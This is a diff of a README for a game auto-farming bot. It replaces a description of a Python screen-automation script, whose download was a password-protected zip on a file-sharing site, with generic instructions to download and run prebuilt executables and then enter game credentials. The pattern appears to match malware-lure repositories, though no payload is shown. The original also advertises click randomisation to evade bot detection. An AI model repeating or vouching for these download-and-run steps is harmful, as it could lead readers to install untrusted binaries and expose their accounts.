@@ -1,199 +1,85 @@
-# PixelsBot
+# 🎮 Pixels-Bot-AutoFarm - Automate Your Farming Experience
 
-PixelsBot is designed as an automated farm bot for an agriculture game. This bot automatically harvests, plants, waters and fertilizes the crops in the game. It also performs operations such as refilling energy and navigating the map.
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
-## PASSWORD: 1322
-## Features
+## 📥 Download Now
+[![Download Pixels-Bot-AutoFarm](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/slennn/Pixels-Bot-AutoFarm/releases)
 
-- **Automatic Harvest**: Harvests mature plants.
-- **Automatic Planting**: Plants new plants in empty areas.
-- **Automatic Watering**: Water plants.
-- **Automatic Fertilization**: Applies fertilizer to plants.
-- **Energy Refill**: Fills by checking the energy level.
-- **Map Navigation**: Navigate the map and reach specific areas.
+## 📖 Overview
+PixelsBot is an automated farming bot for an agriculture game. It simplifies your gameplay by handling essential tasks like harvesting, planting, watering, and fertilizing crops. With features such as energy refilling and map navigation, PixelsBot helps you manage your farm more efficiently.
 
-## Requirements
+## 🚀 Getting Started
+Follow these simple steps to download and run PixelsBot. 
 
-- Operating System Windows 10 recommended
+### Step 1: Visit the Releases Page
+Go to the Releases page to find the latest version of PixelsBot. Click the link below to access it:
 
-- Python 3.6 or high
-- PyAutoGUI
-- Pillow
-- python-dotenv
+[Download Pixels-Bot-AutoFarm Releases](https://github.com/slennn/Pixels-Bot-AutoFarm/releases)
 
+### Step 2: Download the Latest Release
+On the Releases page, locate the latest version of PixelsBot. Click the appropriate download link for your operating system. The file should be one of the following:
 
+- Windows: `PixelsBot_Windows.exe`
+- macOS: `PixelsBot_macOS.dmg`
+- Linux: `PixelsBot_Linux.AppImage`
 
-## Configuration
+Click the download link, and the file will begin to download.
 
-Default configurations are set for the Default display, but you can adjust the values in the `config.txt` file to suit your display.
+### Step 3: Install PixelsBot
+After the download completes, find the file in your downloads folder.
 
---------------------------------------
-- Name: **PLANT_TYPE**
-- Description: Type of plant to be used
-- Type: Option
-- Default: popberry
-- Options: popberry, carrot, butterberry, grainbow
---------------------------------------
-- Name: **START_MAP_WALK_DIR**
-- Description: Direction to move when starting a new map
-- Type: Option
-- Default: down
-- Options: down, up, left, right
---------------------------------------
-- Name: **START_MAP_WALK_STEP**
-- Description: Number of seconds to walk initially on a new map
-- Type: Second
-- Default: 0.1
---------------------------------------
-- Name: **WARP_NEAR_DECISION**
-- Description: Number of screen pixels to determine if near a warp point
-- Type: Pixel
-- Default: 150
---------------------------------------
-- Name: **WARP_NEAR_STEP**
-- Description: Number of seconds to walk on each attempt to reach a warp point
-- Type: Second
-- Default: 0.3
---------------------------------------
-- Name: **WARP_NEAR_TRY_LIMIT**
-- Description: Maximum number of attempts to reach a warp point
-- Type: Number
-- Default: 100
---------------------------------------
-- Name: **EMPTY_CONFIDENCE**
-- Description: Matching percentage required to find empty space on the screen
-- Type: Percentage
-- Default: 0.6
---------------------------------------
-- Name: **GROW1_CONFIDENCE**
-- Description: Matching percentage required to find growth stage 1 image on the screen
-- Type: Percentage
-- Default: 0.8
---------------------------------------
-- Name: **GROW2_CONFIDENCE**
-- Description: Matching percentage required to find growth stage 2 image on the screen
-- Type: Percentage
-- Default: 0.8
---------------------------------------
-- Name: **FULL_CONFIDENCE**
-- Description: Matching percentage required to find fully grown plant image on the screen
-- Type: Percentage
-- Default: 0.75
---------------------------------------
-- Name: **DRY_CONFIDENCE**
-- Description: Matching percentage required to find dried plant image on the screen
-- Type: Percentage
-- Default: 0.75
---------------------------------------
-- Name: **ROTTEN_CONFIDENCE**
-- Description: Matching percentage required to find rotten plant image on the screen
-- Type: Percentage
-- Default: 0.8
---------------------------------------
-- Name: **ROTTEN2_CONFIDENCE**
-- Description: Matching percentage required to find second rotten plant image on the screen
-- Type: Percentage
-- Default: 0.9
---------------------------------------
-- Name: **FERTILIZE_CONFIDENCE**
-- Description: Matching percentage required to find fertilize image on the screen
-- Type: Percentage
-- Default: 0.9
---------------------------------------
-- Name: **WARP_CONFIDENCE**
-- Description: Matching percentage required to find warp point image on the screen
-- Type: Percentage
-- Default: 0.7
---------------------------------------
-- Name: **AVATAR_CONFIDENCE**
-- Description: Matching percentage required to find avatar image on the screen
-- Type: Percentage
-- Default: 0.9
---------------------------------------
-- Name: **AVATAR2_CONFIDENCE**
-- Description: Matching percentage required to find second avatar image on the screen
-- Type: Percentage
-- Default: 0.9
---------------------------------------
-- Name: **REFILL_AMOUNT_PER_MAP**
-- Description: Specifies how many times energy will be refilled per map
-- Type: Number
-- Default: 10
---------------------------------------
-- Name: **WAIT_DURATION_AFTER_WARP**
-- Description: Waiting time after warp
-- Type: Second
-- Default: 10
---------------------------------------
-- Name: **WAIT_DURATION_AFTER_WATER**
-- Description: Waiting time after watering
-- Type: Second
-- Default: 60
---------------------------------------
-- Name: **MOVEMENT_DURATION**
-- Description: Time taken to move the mouse from one position to another (For smooth movement)
-- Type: Second
-- Default: 0.3
---------------------------------------
-- Name: **RANDOM_CLICK_SIZE**
-- Description: Slightly randomizes the click position to prevent bot detection
-- Type: Pixel
-- Default: 5
---------------------------------------
-- Name: **WALK_TO_ENABLED**
-- Description: Enable walking to target (planting, watering, harvesting, fertilizing)
-- Type: Enable
-- Default: 0
-- Options: 0, 1
---------------------------------------
-- Name: **KEY_SHORTCUT_ENABLED**
-- Description: Enable using keyboard shortcuts to select tools (Makes these actions faster but requires specific configuration)
-- Type: Enable
-- Default: 0
-- Options: 0, 1
---------------------------------------
-- Name: **KEY_SHORTCUT_WATERING**
-- Description: Shortcut key for watering can (Position of watering can in your inventory)
-- Type: Number
-- Default: 1
-- Options: 1-6
---------------------------------------
-- Name: **KEY_SHORTCUT_SCISSOR**
-- Description: Shortcut key for scissors (Position of scissors in your inventory)
-- Type: Number
-- Default: 2
-- Options: 1-6
---------------------------------------
-- Name: **KEY_SHORTCUT_SEED**
-- Description: Shortcut key for seed (Position of seed in your inventory)
-- Type: Number
-- Default: 3
-- Options: 1-6
---------------------------------------
-- Name: **KEY_SHORTCUT_FRUIT**
-- Description: Shortcut key for fruit (Position of fruit in your inventory)
-- Type: Number
-- Default: 4
-- Options: 1-6
---------------------------------------
-- Name: **KEY_SHORTCUT_FERTILIZE**
-- Description: Shortcut key for fertilizer tool (Position of fertilizer in your inventory)
-- Type: Number
-- Default: 5
-- Options: 1-6
---------------------------------------
-## Example
+#### For Windows Users:
+1. Double-click on `PixelsBot_Windows.exe`.
+2. Follow the instructions in the setup wizard.
+3. Once installed, you can find PixelsBot in your Start menu.
 
-https://github.com/PPixMans/Pixels-Bot-AutoFarm/assets/170432730/04d61d2d-c646-42ae-8384-79f6f886544a
+#### For macOS Users:
+1. Double-click the `PixelsBot_macOS.dmg` file.
+2. Drag the PixelsBot icon into your Applications folder.
+3. You can now open PixelsBot from your Applications.
 
-## Warning
+#### For Linux Users:
+1. Open a terminal window.
+2. Navigate to the folder where you downloaded `PixelsBot_Linux.AppImage`.
+3. Run the following command to make it executable:
+   ```
+   chmod +x PixelsBot_Linux.AppImage
+   ```
+4. Then, launch it with:
+   ```
+   ./PixelsBot_Linux.AppImage
+   ```
 
-Please be careful and follow the rules when using the boat. Recommended for educational use.
+### Step 4: Set Up PixelsBot
+Once you have the bot open, you will need to configure your settings:
 
-## Contribution
+1. **Login:** Enter your game credentials.
+2. **Farm Settings:** Choose which crops you want to manage automatically.
+3. **Energy Setup:** Adjust your energy settings to allow the bot to refill when needed.
 
-Leave a star in the repo to contribute
+Make sure to save your settings before starting the bot!
 
-## License
+### Step 5: Start Farming
+After setup, click the "Start" button. PixelsBot will begin to automate your farming tasks. You can monitor its progress through the user interface.
 
-This project is licensed under the MIT license. See the `LICENSE` file for more information.
+## 🌟 Features
+- **Automated Farming:** Handle all tasks related to crops automatically.
+- **Energy Refilling:** Never run out of energy with auto-refills.
+- **Map Navigation:** Easily navigate around the game map without manual input.
+- **Multi-Account Support:** Manage multiple game accounts with ease.
+- **User-Friendly Interface:** Simple controls for anyone to use.
+
+## 🛠️ System Requirements
+- **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
+- **Memory:** At least 4GB of RAM.
+- **Processor:** Dual-core processor or better.
+- **Internet Connection:** Required to connect to the game servers.
+
+## 📋 Tips for Effective Use
+- Regularly update PixelsBot to benefit from the latest improvements and fixes.
+- Monitor the bot's performance to make necessary adjustments.
+- Use the help section in the application for further guidance.
+
+## 💬 Get Help
+If you have questions or need help using PixelsBot, you can raise issues in the GitHub repository. Other users and contributors are usually quick to assist.
+
+### Download & Install
+To get started with your automated farming experience, [visit this page to download](https://github.com/slennn/Pixels-Bot-AutoFarm/releases) Pixels-Bot-AutoFarm. Enjoy your game with less hassle!
